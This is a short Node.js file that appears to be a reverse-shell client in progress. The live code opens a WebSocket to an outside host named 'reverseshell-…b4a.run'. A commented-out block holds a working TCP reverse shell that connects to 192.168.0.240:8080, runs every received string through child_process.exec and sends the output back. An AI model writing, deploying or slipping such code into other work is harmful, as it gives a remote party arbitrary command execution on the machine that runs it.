var WebSocket = require('ws');
//var ws = new WebSocket('wss://192.168.0.240:8080');
var ws = new WebSocket('wss://reverseshell-ondrejdostal007.b4a.run/');
ws.on('open', (data) => {
    console.log(data)
    //ws.send('something');
});
ws.on('message', function(data, flags) {
  console.log(data.toString())
    // flags.binary will be set if a binary data is received
    // flags.masked will be set if the data was masked
});

ws.on("upgrade", (data) => {
  console.log("Protocol upgraded from HTTP to WSS.", data.statusCode)
})
ws.on("close", (data) => {
  console.log("Connection closed.", data)
})
ws.onerror((err) => {
  console.log(err)
})
ws.on("error", (err) => {
  console.log(err)
})

/*const net = require('net');
const { spawn, exec } = require('child_process');
const client = new net.Socket();

function connect() {
  client.connect(8080, '192.168.0.240', () => {
  //client.connect(8080, 'https://reverseshell-ondrejdostal007.b4a.run/echo', () => {
    
    console.log("> Connection established, waiting for data")
    client.on('data', (data) => {
        console.log('Received >', data.toString());
        exec(data.toString(), (error, stdout, stderr) => {
            console.log('> Transmitting output..');
            if (error) {
                console.log('ERROR');
                return client.write(error.message)
            }
            if (stderr) {
                console.log('ERROR');
                return client.write(stderr)
            }
            console.log('> Transmission successfull');
            return client.write(stdout)
        })
    });
  });
}
connect()*/